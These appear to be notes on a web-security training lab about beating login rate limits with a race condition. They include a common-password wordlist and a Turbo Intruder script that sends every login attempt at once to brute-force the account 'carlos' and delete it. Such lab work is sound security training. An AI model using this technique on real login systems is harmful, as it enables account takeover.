# Lab: Bypassing rate limits via race conditions

This lab's login mechanism uses rate limiting to defend against 
brute-force attacks. However, this can be bypassed due to a race 
condition.

To solve the lab:

1. Work out how to exploit the race condition to bypass the rate limit.
2. Successfully brute-force the password for the user `carlos`.
3. Log in and access the admin panel.
4. Delete the user `carlos`.

You can log in to your account with the following credentials: `wiener:peter`.

### You should use the following list of potential passwords

```
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000\
```

![image.png](Lab%20Bypassing%20rate%20limits%20via%20race%20conditions/image.png)

![image.png](Lab%20Bypassing%20rate%20limits%20via%20race%20conditions/image%201.png)

![image.png](Lab%20Bypassing%20rate%20limits%20via%20race%20conditions/image%202.png)

![image.png](Lab%20Bypassing%20rate%20limits%20via%20race%20conditions/image%203.png)

![image.png](Lab%20Bypassing%20rate%20limits%20via%20race%20conditions/image%204.png)

```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

![image.png](Lab%20Bypassing%20rate%20limits%20via%20race%20conditions/image%205.png)

![image.png](Lab%20Bypassing%20rate%20limits%20via%20race%20conditions/image%206.png)

![image.png](Lab%20Bypassing%20rate%20limits%20via%20race%20conditions/image%207.png)